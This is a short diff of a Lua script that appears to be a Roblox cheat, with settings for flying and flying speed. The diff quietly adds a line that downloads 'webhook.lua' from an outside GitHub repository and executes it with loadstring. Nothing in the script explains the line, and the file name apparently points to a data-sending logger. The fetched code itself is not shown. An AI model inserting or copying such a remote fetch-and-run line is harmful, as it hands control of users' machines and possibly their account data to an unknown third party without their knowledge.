@@ -4,6 +4,8 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ZLens/robmain/refs/heads/main/webhook.lua'))()
+
 local clientConfig = {
 	Flying = false,
 	FlyingSpeed = 50,
